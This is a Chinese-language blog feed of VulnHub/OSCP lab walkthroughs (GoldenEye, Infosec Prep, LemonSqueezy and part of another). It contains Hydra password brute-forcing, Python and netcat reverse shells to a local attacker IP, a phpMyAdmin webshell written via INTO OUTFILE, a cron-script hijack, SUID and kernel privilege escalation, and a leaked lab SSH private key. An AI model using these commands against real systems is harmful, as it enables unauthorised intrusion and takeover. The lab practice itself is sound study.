punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hashf <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>inf <span class="token operator">+</span> time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'[+]Your new hash is : &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>hashf<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'[+]Done'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中可以看出来被hash计算前的字符串为：</p><p><strong>n30:dMASDNB!!#B!#!#33</strong></p><p>这可能是n30用户的系统密码，n30用户有sudo权限，尝试执行sudo:</p><p><img src="/posts/8ddd383c/image-20221215111420748.png"></p><p>用密码:dMASDNB!!#B!#!#33 登录成功！</p><p><img src="/posts/8ddd383c/image-20221215111536361.png"></p><p>获取到root用户的flag。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>本靶机主要考察以下知识点：</p><ul><li>根据nmap扫描出的域名，访问获取线索；</li><li>所谓兔子洞中也可能有隐藏的线索（用户名）；</li><li>利用openssl的版本漏洞，已知公钥获取私钥；</li><li>python文件的反编译，解析源码中硬编码信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoldenEye：利用hydra爆破Pop3密码</title>
      <link href="/posts/d045174b.html"/>
      <url>/posts/d045174b.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/goldeneye-1,240/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>靶机地址：192.168.71.151</p><p>kali地址：192.168.71.139</p><p>nmap扫描端口：</p><p><img src="/posts/d045174b/image-20221212164007152.png"></p><p>除了80端口外，都是邮箱相关的端口，看来这个靶机应该是考察SMTP相关的利用。</p><p><a href="https://www.cnblogs.com/wan-xiang/p/11666728.html">Pop3和SMTP</a></p><h2 id="2-Web应用枚举"><a href="#2-Web应用枚举" class="headerlink" title="2.Web应用枚举"></a>2.Web应用枚举</h2><p>先查看80端口网页：</p><p><img src="/posts/d045174b/image-20221212164103596.png"></p><p>提示去&#x2F;sev-home&#x2F;登录。访问该目录果然弹出个登录界面。</p><p><img src="/posts/d045174b/image-20221212165231296.png"></p><p>查看源码发现个可疑的js文件。</p><p><img src="/posts/d045174b/image-20221212165447952.png"></p><p>terminal.js文件的注释信息里隐藏了一串密码，同时提到了Boris和Natalya两个人名。</p><p><img src="/posts/d045174b/image-20221212165525332.png"></p><p>解码这一串密码，原来是ASCII码。</p><p><img src="/posts/d045174b/image-20221212170045971.png"></p><p>尝试用以下用户名和密码登录<a href="http://192.168.71.151/sev-home/">http://192.168.71.151/sev-home/</a></p><pre class="line-numbers language-none"><code class="language-none">borisInvincibleHack3r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录成功！查看网页中的提示，是要向管理员发邮件来获取系统管理权限；并提示pop3服务在很大的端口上（默认110端口），在扫描时我们扫描到了55006和55007端口，应该就是pop3服务端口。</p><p><img src="/posts/d045174b/image-20221212170250741.png"></p><p>查看网页源码，在源码中再次发现Natalya和Boris两个名字，在最下面很隐蔽的地方。这里提示这两个人是网络管理员。</p><p><img src="/posts/d045174b/image-20221212172339908.png"></p><p>用<a href="https://github.com/sullo/nikto/wiki">Nikto</a>扫描主机：</p><p><img src="/posts/d045174b/image-20221213092418417.png" alt="OSCP考试中可以使用Nikto"></p><p><img src="/posts/d045174b/image-20221212174328303.png"></p><p>扫描到了一个php文件，访问：<a href="http://192.168.71.151/splashAdmin.php">http://192.168.71.151/splashAdmin.php</a></p><p><img src="/posts/d045174b/image-20221212174358949.png"></p><p>在这个页面里，Admin用户的回复中，提示“黄金眼”系统不再使用GCC。还提到了一个用户Xenia。</p><h2 id="3-SMTP枚举和Pop3爆破"><a href="#3-SMTP枚举和Pop3爆破" class="headerlink" title="3.SMTP枚举和Pop3爆破"></a>3.SMTP枚举和Pop3爆破</h2><p>SMTP枚举我不熟悉，在查资料的时候，找到了一位兄弟整理的<a href="https://gabb4r.gitbook.io/oscp-notes/">OSCP笔记</a>，这里包括了所有考点的枚举等方法，感谢这位兄弟！</p><p>利用SMTP进行用户枚举，查看用户是否存在。</p><p>我们之前猜测了三个用户：</p><ul><li>boris</li><li>natalya</li><li>xenia</li></ul><p>连接25端口后，依次用VRFY命令验证。</p><p><img src="/posts/d045174b/image-20221213105544704.png"></p><p>看来在邮件系统中，boris和natalya用户是存在的。</p><p>尝试用<strong>boris：InvincibleHack3r</strong>登录Pop3服务。</p><p><img src="/posts/d045174b/image-20221213141252433.png"></p><p>认证失败。</p><p>用<a href="https://www.kali.org/tools/hydra/">hydra</a>爆破邮箱密码。</p><pre class="line-numbers language-none"><code class="language-none">hydra -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt  -l natalya 192.168.71.151 -s 55007 -I pop3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d045174b/image-20221213142312036.png"></p><p>密码爆破成功，boris用户密码为secret1!</p><p>同样，爆破natalya的密码：</p><p><img src="/posts/d045174b/image-20221213142730348.png"></p><p>爆破成功，natalya用户密码为bird</p><p>用获取的账密信息登录pop3服务，获取邮件信息。</p><p>boris邮箱中有三封邮件：</p><p><img src="/posts/d045174b/image-20221213143523209.png" alt="来自root管理员"></p><p><img src="/posts/d045174b/image-20221213143616396.png" alt="来自natalya"></p><p><img src="/posts/d045174b/image-20221213143953391.png"></p><p>natalya邮箱中的邮件：</p><p><img src="/posts/d045174b/image-20221213144519419.png"></p><p>第二封邮件里发现了重要的信息：</p><p><img src="/posts/d045174b/image-20221213144807616.png"></p><ul><li>GNO系统的账号密码：</li></ul><p>​username: xenia<br>​password: RCP90rulez!</p><ul><li>域名：severnaya-station.com</li><li>URL地址：severnaya-station.com&#x2F;gnocertdir</li></ul><p>按照提示编辑&#x2F;etc&#x2F;hosts文件：</p><p><img src="/posts/d045174b/image-20221213160656830.png"></p><p>访问GNO系统：</p><p><img src="/posts/d045174b/image-20221213160829126.png"></p><p>用账号密码登录：</p><p><img src="/posts/d045174b/image-20221213161108150.png"></p><p>登录系统后，发现收到了一封来自doak的邮件。</p><p><img src="/posts/d045174b/image-20221213162731752.png"></p><p>用之前的方法爆破doak的密码。</p><p><img src="/posts/d045174b/image-20221213163136840.png"></p><p>doak用户的密码goat。查看邮件：</p><p><img src="/posts/d045174b/image-20221213163405591.png"></p><p>username: dr_doak<br>password: 4England!</p><p>以这个账号登录GUO系统，发现了一个秘密文件：</p><p><img src="/posts/d045174b/image-20221213163829263.png"></p><p>秘密文件提示到&#x2F;dir007key&#x2F;for-007.jpg去找管理员的账号信息。</p><p><img src="/posts/d045174b/image-20221213164100408.png"></p><p>查看图片：</p><p><img src="/posts/d045174b/image-20221213164151732.png"></p><p>用exiftool工具分析该图片，发现了一串base64编码：</p><p><img src="/posts/d045174b/image-20221213165209819.png"></p><p>base64解码：</p><p><img src="/posts/d045174b/image-20221213170153301.png"></p><p>根据邮件信息，解码出的**xWinter1995x!**为用户admin的密码。</p><h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>以admin登录GNO系统，在<strong>Settings &gt; Site administration &gt; Server &gt; System Paths</strong>目录下找到shell payload注入点：</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.71.139&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d045174b/image-20221213171258622.png"></p><p>然后创建新blog并点击拼写检查来触发shellcode，然而并没有成功。</p><p><img src="/posts/d045174b/image-20221213171608911.png"></p><p>这是因为这个系统是以moodle为模板，而该模板的默认拼写检查并不是刚才设置了shellcode的aspell。</p><p>在 <strong>Settings &gt; Site administration &gt;Plugins&gt; Text editors &gt; TinyMCE HTMl editor</strong>路径下修改默认拼写检查插件。</p><p><img src="/posts/d045174b/image-20221213172137015.png"></p><p>将默认拼写插件改成PSpellShell.然后再次通过点击blog的拼写检查来触发。</p><p><img src="/posts/d045174b/image-20221213173600758.png"></p><p>反弹shell成功！当前用户为www-data。</p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>查看系统信息：</p><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;lsb-release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d045174b/image-20221213180528958.png"></p><p>发现系统是Ubuntu 14.04，搜索exploit-db发现存在<a href="https://www.exploit-db.com/exploits/37292">漏洞</a> ：overlayfs本地提权</p><p>把exploit下载下来，是c文件。还记得之前在boris的留言板中管理员回复过系统没有gcc，因此无法用gcc编译。</p><p>把源码中的“gcc”改成“cc”。</p><p><img src="/posts/d045174b/image-20221213181513108.png"></p><p>把源码上传到靶机后编译：</p><p><img src="/posts/d045174b/image-20221213182739564.png"></p><pre class="line-numbers language-none"><code class="language-none">cc ofs.c -o ofs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行ofs文件后，获取到root权限：</p><p><img src="/posts/d045174b/image-20221213182838134.png"></p><p>查看flag文件</p><p><img src="/posts/d045174b/image-20221213183013902.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>这个靶机是做得很痛苦啊！无论是邮件相关枚举还是进入系统后查找反弹shell的注入点，都很麻烦很绕。最后还设置了一个没有gcc的门槛。全程看别人的walkthrough完成。</p><p>主要考察知识点如下：</p><ul><li>SMTP和Pop3的命令</li><li>使用hydra爆破密码</li><li>寻找反弹shell注入点的能力</li><li>利用系统版本漏洞提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Infosec：利用OpenSSH私钥登录</title>
      <link href="/posts/bbcbdc7c.html"/>
      <url>/posts/bbcbdc7c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫端口：</p><p><img src="/posts/bbcbdc7c/image-20221212111910598.png"></p><p>开放端口</p><ul><li>22 ssh OpenSSH 8.2p1</li><li>80 http Apache httpd 2.4.41</li><li>33060 mysqlx?</li></ul><h2 id="2-发现SSH私钥"><a href="#2-发现SSH私钥" class="headerlink" title="2.发现SSH私钥"></a>2.发现SSH私钥</h2><p>扫描目录，扫描出了robots.txt，查看了一下，发现泄漏了文件secret.txt</p><p><img src="/posts/bbcbdc7c/image-20221212114815268.png"></p><p>查看secret.txt文件，首先这个文件名就很有意思，方向应该是对的。看到最后两个等号猜测是base64编码后的数据。</p><p><img src="/posts/bbcbdc7c/image-20221212114844237.png"></p><p>base64解码：</p><p><img src="/posts/bbcbdc7c/image-20221212114923426.png"></p><p>得到了OpenSSH的私钥文件，在kali上保存为secret.txt。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了私钥文件，但是没有用户名。这时仔细看80端口的网页，发现了提示：</p><p><img src="/posts/bbcbdc7c/image-20221212145508221.png"></p><p>OpenSSH除了可以用用户名密码登录之外，也可以利用私钥公钥对登录。现在利用用户名oscp和私钥登录靶机，-i参数指定私钥文件。命令如下：</p><pre class="line-numbers language-none"><code class="language-none">ssh -i secret.txt oscp@192.168.71.150<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/bbcbdc7c/image-20221212145620799.png"></p><p>登录成功，查看一下现在的权限，是oscp用户权限。</p><p><img src="/posts/bbcbdc7c/image-20221212150335574.png"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>思路还是suid提权，查找suid权限文件命令如下：</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/bbcbdc7c/image-20221212150503007.png"></p><p>发现bash文件可以直接利用。这里要注意加-p参数，否则提权不成功。</p><p>-p选项让bash保留启动时使用的有效用户id，而如果没有它，它将把有效uid设置为实际的uid(您的用户)。即-p参数可使会话保持在程序拥有者的权限，否则会回到本来的权限（本例为oscp用户）。</p><p><img src="/posts/bbcbdc7c/image-20221212151610328.png"></p><p>获取flag文件，提权成功！</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机非常简单，没有那么多绕的可以说只有一步。</p><p>我不熟悉的地方是获取到ssh私钥文件之后的登录方式，这次记住了。</p><p>另外在提权方面，suid文件提权用得情况很多，近期会出一个suid提权知识总结。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LemonSqueezy：利用wpscan扫描WordPress进行用户枚举和弱口令爆破</title>
      <link href="/posts/7bd2dc8.html"/>
      <url>/posts/7bd2dc8.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/lemonsqueezy-1,473/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>靶机地址：192.168.71.135</p><p>kali地址：192.168.71.129</p><p>端口扫描</p><p><img src="/posts/7bd2dc8/image-20221204220748966.png"></p><p>只开放了80端口，打开为apache的默认页面。继续扫描目录：</p><pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;192.168.71.135&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/7bd2dc8/image-20221204220640513.png"></p><p>扫出了两个应用：phpmyadmin和wordpress</p><p><img src="/posts/7bd2dc8/image-20221204220935937.png"></p><p><img src="/posts/7bd2dc8/image-20221204221037642.png" alt="wordpress"></p><h2 id="2-扫描WordPress"><a href="#2-扫描WordPress" class="headerlink" title="2.扫描WordPress"></a>2.扫描WordPress</h2><p>这里用到<a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>来扫描WordPress应用，它是一个专门针对于WordPress的安全扫描器。</p><p>用以下命令枚举用户：</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;192.168.71.135&#x2F;wordpress -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/7bd2dc8/image-20221214211727528.png"></p><p>爆破出来两个用户名：lemon和orange</p><p>接下来可以利用wpscan爆破密码，这里可以修改&#x2F;etc&#x2F;hosts，把域名加入。</p><p><img src="/posts/7bd2dc8/image-20221214213241271.png"></p><p>用以下命令爆破密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://lemonsqueezy/wordpress <span class="token parameter variable">--passwords</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--usernames</span> lemon,orange<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/7bd2dc8/image-20221214214416663.png"></p><p>获取到了orange用户的密码为ginger。好的，现在登录WordPress！</p><p><img src="/posts/7bd2dc8/image-20221214214727822.png"></p><p>登录之后，在post页面中发现了类似密码的东西。想起来还有一个phpmyadmin应用没有利用，所以尝试能否登录。</p><p>用户名还是orange，密码n0t1n@w0rdl1st!，登录phpmyadmin系统。</p><p>登录后在wordpress数据库的wp_users表中发现了用户信息：</p><p><img src="/posts/7bd2dc8/image-20221214215321832.png"></p><p>然后用hash分析器分析这是什么hash，但是没有成功。把lemon的hash改成orange的hash，也没有登录成功。</p><h2 id="3-利用Phpmyadmin获取反弹shell"><a href="#3-利用Phpmyadmin获取反弹shell" class="headerlink" title="3.利用Phpmyadmin获取反弹shell"></a>3.利用Phpmyadmin获取反弹shell</h2><p>在phpmyadmin的SQL页面，输入以下命令：</p><pre class="line-numbers language-none"><code class="language-none">SELECT &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;backdoor.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/7bd2dc8/image-20221214221413942.png"></p><p>这里是在靶机上创建一个backdoor.php文件，可以作为以cmd为参数的webshell。</p><p>访问后门，webshell执行成功！</p><p><img src="/posts/7bd2dc8/image-20221214221821883.png"></p><p>那么现在获取反弹shell，webshell的cmd参数为：</p><pre class="line-numbers language-none"><code class="language-none">nc -e &#x2F;bin&#x2F;bash 192.168.71.129 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取shell成功，当前用户为www-data。</p><p><img src="/posts/7bd2dc8/image-20221214222222760.png"></p><p>获取到user.txt。</p><p><img src="/posts/7bd2dc8/image-20221214222431947.png" alt="用户flag"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>利用<a href="https://github.com/DominicBreuker/pspy">pspy工具</a>对系统进程进行监控，首先把pspy脚本上传到靶机上去。</p><p>kali</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;192.168.71.129:8000&#x2F;pspy64s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动pspy：</p><pre class="line-numbers language-none"><code class="language-none">chmod +x pspy64s &amp;&amp; .&#x2F;pspy64s -p -i 1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现可疑程序，每两分钟运行一次，作用是删除&#x2F;tmp文件夹下的文件。</p><p><img src="/posts/7bd2dc8/image-20221214230313191.png"></p><p>查看这个文件，发现它可以被任何用户读、写和执行，拥有者为root。</p><p><img src="/posts/7bd2dc8/image-20221214230746456.png"></p><p>查看这个文件，是一个python程序。</p><p><img src="/posts/7bd2dc8/image-20221214231338318.png"></p><p>把它修改为python reverse shell：</p><pre class="line-numbers language-none"><code class="language-none">echo &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.71.129&quot;,4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; &gt;&gt; logrotate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待几分钟，待程序执行时，在kali监听端口中获得反弹shell。</p><p><img src="/posts/7bd2dc8/image-20221214231626426.png"></p><p>获取到root权限和root用户flag。</p><p><img src="/posts/7bd2dc8/image-20221214231811656.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这个靶机主要考察以下知识点：</p><ul><li><strong>wpscan</strong>为专用于扫描WordPres的工具，可以枚举用户及爆破密码；</li><li>利用phpmyadmin获取webshell；</li><li>pspy工具监控进程运行，修改程序执行反弹shell代码</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DevGuru：利用GitTools获取git仓库内容</title>
      <link href="/posts/790d5f77.html"/>
      <url>/posts/790d5f77.html</url>
      
